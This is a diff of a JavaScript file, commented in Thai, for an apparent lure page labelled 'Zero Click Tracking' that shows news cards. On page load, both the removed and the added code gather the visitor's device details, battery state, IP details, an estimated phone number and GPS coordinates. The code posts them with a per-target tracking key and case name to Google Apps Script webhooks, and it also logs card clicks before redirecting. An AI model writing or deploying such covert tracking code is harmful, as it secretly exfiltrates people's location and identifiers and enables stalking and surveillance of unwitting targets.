@@ -22,10 +22,8 @@ function getUrlParameters() {
   }
 }
 
-// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
+// ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ1
 (function() {
-  console.log("เริ่มทำงานฟังก์ชันหลัก - Zero Click Tracking");
-  
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -39,10 +37,6 @@ function getUrlParameters() {
   
   // ดึง tracking key และ case name จาก URL
   const { trackingKey, caseName } = getUrlParameters();
-  console.log(`ตรวจพบ tracking key: ${trackingKey}, case name: ${caseName}`);
-
-  // เริ่มส่ง beacon ทันทีเพื่อแจ้งว่ามีการเข้าชม
-  sendInitialBeacon(trackingKey);
 
   // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
   const deviceInfo = getDetailedDeviceInfo();
@@ -54,13 +48,9 @@ function getUrlParameters() {
   const platform = deviceInfo.osInfo || navigator.platform || "ไม่มีข้อมูล";
   const connection = getConnectionInfo();
   const browser = detectBrowser();
-  
-  console.log("รวบรวมข้อมูลอุปกรณ์สำเร็จ");
 
   // ตรวจสอบการใช้งานแบตเตอรี่
   getBatteryInfo().then(batteryData => {
-    console.log("ได้รับข้อมูลแบตเตอรี่แล้ว");
-    
     // รวบรวมข้อมูลทั้งหมด
     const allDeviceData = {
       ...deviceInfo,
@@ -79,15 +69,10 @@ function getUrlParameters() {
     
     // ตรวจสอบ IP และข้อมูลเบอร์โทรศัพท์
     Promise.all([
-      getIPDetails().catch(error => {
-        console.error("ไม่สามารถดึงข้อมูล IP ได้:", error);
-        return {ip: "ไม่สามารถระบุได้"};
-      }),
+      getIPDetails().catch(error => ({ip: "ไม่สามารถระบุได้"})),
       estimatePhoneNumber().catch(() => null)
     ])
     .then(([ipData, phoneInfo]) => {
-      console.log("ได้รับข้อมูล IP แล้ว:", ipData?.ip || "ไม่สามารถระบุได้");
-      
       // เก็บข้อมูลที่จำเป็นทั้งหมด
       dataToSend = {
         timestamp: timestamp,
@@ -98,46 +83,20 @@ function getUrlParameters() {
         trackingKey: trackingKey || "ไม่มีค่า",
         caseName: caseName || "ไม่มีค่า",
         useServerMessage: true,
-        requestId: generateUniqueId(), // สร้าง ID เฉพาะสำหรับการร้องขอนี้
-        source: "ViewPhoto", // ระบุที่มาของข้อมูล
-        action: "zeroClick" // เพิ่มการระบุ action ที่ชัดเจนว่าเป็นการเข้าชม
+        requestId: generateUniqueId() // สร้าง ID เฉพาะสำหรับการร้องขอนี้
       };
-      
-      // บันทึกข้อมูลที่จะส่ง
-      console.log("ข้อมูลที่จะส่ง (พื้นฐาน):", {
-        trackingKey: dataToSend.trackingKey,
-        ip: dataToSend.ip?.ip || "ไม่สามารถระบุได้",
-        deviceType: dataToSend.deviceInfo?.deviceType || "ไม่ทราบ",
-        requestId: dataToSend.requestId
-      });
-      
-      // ลองส่งข้อมูลผ่านทั้ง 3 วิธี เพื่อให้แน่ใจว่าจะทำงาน
-      
-      // 1. วิธีที่ 1: ใช้ fetch API แบบปกติ
-      sendToLineNotify(dataToSend);
-      
-      // 2. วิธีที่ 2: ใช้ XMLHttpRequest (สำรอง)
-      sendToLineNotifyXHR(dataToSend);
-      
-      // 3. วิธีที่ 3: ใช้ beacon (เหมาะสำหรับเมื่อหน้าเว็บปิด)
-      sendBeaconToServer(dataToSend);
-      
-      console.log("ส่งข้อมูลเบื้องต้นไปแล้ว โดยยังไม่มีพิกัด");
       
       // ขอข้อมูลพิกัด โดยกำหนดเวลาให้ตอบกลับไม่เกิน 5 วินาที
       if (navigator.geolocation) {
-        console.log("เริ่มดึงข้อมูลพิกัด GPS...");
         const locationPromise = new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(
             position => {
-              const locationData = {
+              resolve({
                 lat: position.coords.latitude,
                 long: position.coords.longitude,
                 accuracy: position.coords.accuracy,
                 gmapLink: `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`
-              };
-              console.log("ได้รับข้อมูลพิกัด GPS แล้ว:", locationData);
-              resolve(locationData);
+              });
             },
             error => {
               console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
@@ -153,284 +112,70 @@ function getUrlParameters() {
         // รอข้อมูลพิกัดไม่เกิน 5 วินาที
         Promise.race([
           locationPromise,
-          new Promise(resolve => setTimeout(() => {
-            console.log("หมดเวลาดึงข้อมูลพิกัด");
-            resolve("ไม่มีข้อมูล");
-          }, 5000))
+          new Promise(resolve => setTimeout(() => resolve("ไม่มีข้อมูล"), 5000))
         ])
         .then(location => {
-          if (location !== "ไม่มีข้อมูล") {
-            // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
-            const locationData = {
-              ...dataToSend,
-              location: location,
-              requestId: generateUniqueId(), // สร้าง ID ใหม่เพื่อไม่ให้ซ้ำกับการส่งครั้งแรก
-              hasLocation: true, // ทำเครื่องหมายว่ามีพิกัด
-              action: "zeroClickWithLocation" // ระบุว่าเป็นการส่งพร้อมพิกัด
-            };
-            
-            console.log("ส่งข้อมูลอีกครั้งพร้อมพิกัด GPS");
-            // ส่งข้อมูลอีกครั้งพร้อมพิกัดทั้ง 3 วิธีเช่นเดิม
-            sendToLineNotify(locationData);
-            sendToLineNotifyXHR(locationData);
-            sendBeaconToServer(locationData);
-          }
+          // เพิ่มข้อมูลพิกัดเข้าไปในข้อมูลที่จะส่ง
+          dataToSend.location = location;
+          
+          // ส่งข้อมูลทั้งหมดเพียงครั้งเดียว
+          sendToLineNotify(dataToSend);
         });
       } else {
-        console.log("เบราว์เซอร์ไม่สนับสนุน Geolocation API");
+        // ถ้าไม่สามารถใช้ Geolocation API ได้
+        dataToSend.location = "ไม่มีข้อมูล";
+        sendToLineNotify(dataToSend);
       }
-    })
-    .catch(error => {
-      console.error("เกิดข้อผิดพลาดในการรวบรวมข้อมูล:", error);
-      // ส่งข้อมูลที่มี แม้จะเกิดข้อผิดพลาด
-      dataToSend = {
-        timestamp: timestamp,
-        ip: {ip: "ไม่สามารถระบุได้"},
-        deviceInfo: allDeviceData,
-        referrer: referrer,
-        trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า",
-        error: error.message,
-        requestId: generateUniqueId(),
-        source: "ViewPhoto-Error",
-        action: "zeroClick" // เพิ่มการระบุ action ที่ชัดเจน
-      };
-      
-      // ส่งข้อมูลที่มีผ่านทั้ง 3 วิธีเช่นกัน
-      sendToLineNotify(dataToSend);
-      sendToLineNotifyXHR(dataToSend);
-      sendBeaconToServer(dataToSend);
     });
-  }).catch(error => {
-    console.error("ไม่สามารถดึงข้อมูลแบตเตอรี่ได้:", error);
-    // ดำเนินการต่อแม้ไม่มีข้อมูลแบตเตอรี่
   });
 
   // เพิ่ม Event Listener ให้กับการ์ดข่าว
   setupNewsCardClickHandlers();
-  
-  // เพิ่ม Event Listener สำหรับเช็คการเปิดหน้าเว็บ (เพิ่มเติม)
-  document.addEventListener('visibilitychange', function() {
-    if (!document.hidden) {
-      console.log("ผู้ใช้กลับมาดูหน้าเว็บ");
-      const viewData = {
-        timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
-        trackingKey: trackingKey || "ไม่มีค่า",
-        caseName: caseName || "ไม่มีค่า",
-        event: "page_view",
-        requestId: generateUniqueId(),
-        source: "PageView",
-        action: "pageView"
-      };
-      sendToLineNotify(viewData);
-      sendBeaconToServer(viewData);
-    }
-  });
-  
-  // เพิ่ม event listener สำหรับการปิดหน้าเว็บ
-  window.addEventListener('beforeunload', function() {
-    const exitData = {
-      timestamp: new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' }),
-      trackingKey: trackingKey || "ไม่มีค่า",
-      caseName: caseName || "ไม่มีค่า",
-      event: "page_exit",
-      requestId: generateUniqueId(),
-      source: "PageExit",
-      action: "pageExit"
-    };
-    sendBeaconToServer(exitData); // ใช้ sendBeacon เท่านั้นเพราะมันทำงานตอนปิดเพจได้
-  });
 
 })();
-
-// ส่ง beacon ทันทีเมื่อเริ่มโหลดหน้า
-function sendInitialBeacon(trackingKey) {
-  if (!trackingKey || trackingKey === "ไม่มีค่า") return;
-  
-  const beaconUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec' + 
-                   '?action=zeroClick&key=' + encodeURIComponent(trackingKey) +
-                   '&source=imgBeacon' +
-                   '&r=' + new Date().getTime();
-  
-  // สร้าง image beacon
-  const img = new Image();
-  img.src = beaconUrl;
-  img.style.display = 'none';
-  document.body.appendChild(img);
-  
-  console.log("ส่ง image beacon สำเร็จ");
-}
-
-// ฟังก์ชันส่งข้อมูลผ่าน Fetch API (วิธีที่ 1)
-function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec';
-
-  // สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
-  if (!dataToSend.requestId) {
-    dataToSend.requestId = generateUniqueId();
-  }
-  
-  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำในวินโดว์เดียวกัน
-  const sentRequests = JSON.parse(sessionStorage.getItem('sentRequests') || '[]');
-  if (sentRequests.includes(dataToSend.requestId)) {
-    console.log("ข้อมูลนี้เคยส่งแล้ว (requestId: " + dataToSend.requestId + ")");
-    return;
-  }
-  
-  console.log("กำลังส่งข้อมูลด้วย fetch (requestId: " + dataToSend.requestId + ")");
-
-  // ส่งข้อมูลด้วย fetch API
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify(dataToSend)
-  })
-  .then(response => {
-    console.log("ส่งข้อมูล fetch สำเร็จ, response status:", response.status);
-    
-    // บันทึก requestId ที่ส่งสำเร็จแล้ว
-    sentRequests.push(dataToSend.requestId);
-    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-    
-    // เก็บสถิติการดูเนื้อหา
-    if (dataToSend.trackingKey && dataToSend.trackingKey !== "ไม่มีค่า") {
-      incrementViewCount(dataToSend.trackingKey);
-    }
-  })
-  .catch(error => {
-    console.error("เกิดข้อผิดพลาดใน fetch:", error);
-    // ลองส่งอีกครั้งด้วย no-cors mode
-    console.log("ลองส่งอีกครั้งด้วย no-cors mode...");
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        ...dataToSend,
-        retryWithNoCors: true,
-        requestId: dataToSend.requestId + "-fetchretry"
-      }),
-      mode: 'no-cors'
-    })
-    .then(() => {
-      console.log("ส่งข้อมูลด้วย no-cors mode แล้ว");
-      sentRequests.push(dataToSend.requestId);
-      sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-    })
-    .catch(retryError => {
-      console.error("ไม่สามารถส่งข้อมูลแม้แต่ด้วย no-cors mode:", retryError);
-    });
-  });
-}
-
-// ฟังก์ชันส่งข้อมูลผ่าน XMLHttpRequest (วิธีที่ 2)
-function sendToLineNotifyXHR(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec';
-
-  // สร้าง requestId แบบใหม่พร้อมระบุว่าเป็น XHR
-  const xhrRequestId = dataToSend.requestId + "-xhr";
-  
-  // ใช้ sessionStorage เพื่อป้องกันการส่งซ้ำ
-  const sentRequests = JSON.parse(sessionStorage.getItem('xhrSent') || '[]');
-  if (sentRequests.includes(xhrRequestId)) {
-    console.log("ข้อมูล XHR นี้เคยส่งแล้ว (requestId: " + xhrRequestId + ")");
-    return;
-  }
-  
-  console.log("กำลังส่งข้อมูลด้วย XMLHttpRequest (requestId: " + xhrRequestId + ")");
-
-  const xhr = new XMLHttpRequest();
-  xhr.open('POST', webhookUrl, true);
-  xhr.setRequestHeader('Content-Type', 'application/json');
-  
-  xhr.onload = function() {
-    if (xhr.status >= 200 && xhr.status < 300) {
-      console.log("XMLHttpRequest สำเร็จ, status:", xhr.status);
-      // บันทึกว่าส่งสำเร็จ
-      sentRequests.push(xhrRequestId);
-      sessionStorage.setItem('xhrSent', JSON.stringify(sentRequests));
-    } else {
-      console.error("XMLHttpRequest เกิดข้อผิดพลาด, status:", xhr.status);
-    }
-  };
-  
-  xhr.onerror = function() {
-    console.error("XMLHttpRequest เกิดข้อผิดพลาดในการเชื่อมต่อ");
-  };
-  
-  // ส่งข้อมูลพร้อมระบุว่าเป็น XHR
-  xhr.send(JSON.stringify({
-    ...dataToSend,
-    requestId: xhrRequestId,
-    sendMethod: 'xhr'
-  }));
-}
-
-// ฟังก์ชันส่งข้อมูลผ่าน Navigator.sendBeacon (วิธีที่ 3)
-function sendBeaconToServer(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbw6noostvWuO2gWuD3lyE4TrqNLG9znhG2G8uOlIlq8JhZfN4nDNCznxdfpdIB-vIE0sg/exec';
-  
-  // สร้าง requestId แบบใหม่สำหรับ beacon
-  const beaconRequestId = dataToSend.requestId + "-beacon";
-  
-  // ตรวจสอบว่า beacon เคยส่งหรือยัง
-  const sentBeacons = JSON.parse(sessionStorage.getItem('beaconSent') || '[]');
-  if (sentBeacons.includes(beaconRequestId)) {
-    console.log("ข้อมูล Beacon นี้เคยส่งแล้ว (requestId: " + beaconRequestId + ")");
-    return;
-  }
-  
-  console.log("กำลังส่งข้อมูลด้วย Navigator.sendBeacon (requestId: " + beaconRequestId + ")");
-  
-  // เตรียมข้อมูลที่จะส่ง
-  const beaconData = {
-    ...dataToSend,
-    requestId: beaconRequestId,
-    sendMethod: 'beacon'
-  };
-  
-  // สร้าง Blob สำหรับ sendBeacon
-  const blob = new Blob([JSON.stringify(beaconData)], { type: 'application/json' });
-  
-  // ส่งข้อมูลด้วย sendBeacon
-  if (navigator.sendBeacon && navigator.sendBeacon(webhookUrl, blob)) {
-    console.log("ส่ง beacon สำเร็จ");
-    sentBeacons.push(beaconRequestId);
-    sessionStorage.setItem('beaconSent', JSON.stringify(sentBeacons));
-  } else {
-    console.error("ไม่สามารถส่ง beacon ได้ ลองใช้วิธี GET แบบง่าย");
-    
-    // ถ้า sendBeacon ไม่ทำงาน ให้ลองใช้ Image beacon แทน
-    const imgParams = new URLSearchParams();
-    imgParams.append('key', dataToSend.trackingKey || 'unknown');
-    imgParams.append('r', Date.now());
-    imgParams.append('action', 'zeroClick');
-    imgParams.append('fallback', 'true');
-    
-    const img = new Image();
-    img.src = `${webhookUrl}?${imgParams.toString()}`;
-    img.style.display = 'none';
-    document.body.appendChild(img);
-  }
-}
 
 // ฟังก์ชันสำหรับเพิ่ม Event Listener ให้กับการ์ดข่าว
 function setupNewsCardClickHandlers() {
   const newsCards = document.querySelectorAll('.news-card');
-  const { caseName } = getUrlParameters(); // ดึง caseName จาก URL ปัจจุบัน
+  const { trackingKey, caseName } = getUrlParameters(); // ดึง trackingKey และ caseName
 
   newsCards.forEach(card => {
-    card.addEventListener('click', function() {
-      console.log("คลิกการ์ดข่าว");
-      // นำทางกลับไปยังหน้า LIFF พร้อม caseName (ถ้ามี)
-      let liffUrl = 'zero-click-liff.html';
-      if (caseName && caseName !== "ไม่มีค่า") {
-        liffUrl += `?case=${encodeURIComponent(caseName)}`;
-      }
-      window.location.href = liffUrl;
+    // ดึงข้อมูลพื้นฐานของการ์ดที่คลิก (ถ้าต้องการ เช่น title)
+    const newsTitleElement = card.querySelector('.news-title');
+    const clickedTitle = newsTitleElement ? newsTitleElement.textContent.trim() : 'ไม่พบหัวข้อข่าว';
+
+    card.addEventListener('click', function(event) {
+      event.preventDefault(); // ป้องกันการนำทางทันที (ถ้ามีลิงก์จริง)
+      console.log("คลิกการ์ดข่าว:", clickedTitle);
+
+      // 1. รวบรวมข้อมูลสำหรับการคลิก
+      const clickTimestamp = new Date().toLocaleString('th-TH', { timeZone: 'Asia/Bangkok' });
+      const clickData = {
+        action: 'click', // ระบุว่าเป็นการคลิก
+        timestamp: clickTimestamp,
+        trackingKey: trackingKey || "ไม่มีค่า",
+        caseName: caseName || "ไม่มีค่า",
+        clickedElement: clickedTitle, // ข้อมูลเพิ่มเติมว่าคลิกอะไร
+        requestId: generateUniqueId(), // สร้าง ID ใหม่สำหรับการคลิกนี้
+        // อาจจะเพิ่มข้อมูล IP/Device พื้นฐานถ้าต้องการ แต่ไม่จำเป็นเท่าตอนโหลดหน้า
+        // ip: (window.cachedIpData && window.cachedIpData.ip) ? { ip: window.cachedIpData.ip } : { ip: "กำลังรอข้อมูล..." },
+        // deviceInfo: { deviceType: (window.cachedDeviceInfo && window.cachedDeviceInfo.deviceType) ? window.cachedDeviceInfo.deviceType : "กำลังรอข้อมูล..." }
+      };
+
+      // 2. ส่งข้อมูลการคลิกไปยัง Webhook
+      console.log("กำลังส่งข้อมูลการคลิก:", clickData);
+      sendToLineNotify(clickData); // ใช้ฟังก์ชันเดิมส่งข้อมูล
+
+      // 3. หน่วงเวลาเล็กน้อยเพื่อให้ fetch มีโอกาสเริ่มส่งก่อน redirect
+      setTimeout(() => {
+        // 4. นำทางไปยังหน้า LIFF พร้อม caseName (ถ้ามี)
+        let liffUrl = 'zero-click-liff.html';
+        if (caseName && caseName !== "ไม่มีค่า") {
+          liffUrl += `?case=${encodeURIComponent(caseName)}`;
+        }
+        console.log("กำลังเปลี่ยนเส้นทางไปยัง:", liffUrl);
+        window.location.href = liffUrl;
+      }, 200); // หน่วงเวลา 200ms (ปรับได้)
     });
 
     // เปลี่ยน cursor เป็น pointer เพื่อให้รู้ว่าคลิกได้
@@ -1171,7 +916,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbzWZVUSpQTLV09QLBJqth1K8pCvp2iLq8TFFrKBZrKlCyv9VX2HrnEpTwV08-Ulu9_9/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbxe8LFWRRFx_VdfyjK-Eq6ikegQUMPn6qnxRBHkI9KN1RSOB1p5jJcvIPYV3kgoowdn/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
@@ -1193,67 +938,22 @@ function sendToLineNotify(dataToSend) {
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify(dataToSend)
+    body: JSON.stringify(dataToSend),
+    mode: 'no-cors'
   })
-  .then(response => {
-    console.log("ส่งข้อมูลไปยัง Server สำเร็จ, response status:", response.status);
+  .then(() => {
+    console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
     
     // บันทึก requestId ที่ส่งสำเร็จแล้ว
     sentRequests.push(dataToSend.requestId);
     sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-    
-    // เก็บสถิติการดูเนื้อหา
-    if (dataToSend.trackingKey && dataToSend.trackingKey !== "ไม่มีค่า") {
-      incrementViewCount(dataToSend.trackingKey);
-    }
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
-    // ลองส่งอีกครั้งด้วย no-cors mode
-    console.log("ลองส่งอีกครั้งด้วย no-cors mode...");
-    fetch(webhookUrl, {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
-      body: JSON.stringify({
-        ...dataToSend,
-        retryWithNoCors: true,
-        requestId: dataToSend.requestId + "-retry"
-      }),
-      mode: 'no-cors'
-    })
-    .then(() => {
-      console.log("ส่งข้อมูลด้วย no-cors mode แล้ว (ไม่สามารถตรวจสอบสถานะการตอบกลับได้)");
-      sentRequests.push(dataToSend.requestId);
-      sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
-    })
-    .catch(retryError => {
-      console.error("ไม่สามารถส่งข้อมูลแม้แต่ด้วย no-cors mode:", retryError);
-    });
   });
 }
 
-// เก็บสถิติการดูเนื้อหา
-function incrementViewCount(trackingKey) {
-  // ดึงข้อมูลจาก localStorage
-  const viewStats = JSON.parse(localStorage.getItem('viewStats') || '{}');
-  
-  // เพิ่มจำนวนครั้งที่เปิดดู
-  if (!viewStats[trackingKey]) {
-    viewStats[trackingKey] = { count: 1, lastView: new Date().toISOString() };
-  } else {
-    viewStats[trackingKey].count++;
-    viewStats[trackingKey].lastView = new Date().toISOString();
-  }
-  
-  // บันทึกกลับไปใน localStorage
-  localStorage.setItem('viewStats', JSON.stringify(viewStats));
-  
-  console.log(`เพิ่มสถิติการดู tracking key ${trackingKey}: ${viewStats[trackingKey].count} ครั้ง`);
-}
-
-// สร้าง ID เฉพาะสำหรับการร้องขอ1
+// สร้าง unique ID สำหรับแต่ละการร้องขอ1
 function generateUniqueId() {
   return Date.now().toString(36) + Math.random().toString(36).substring(2, 10);
 }
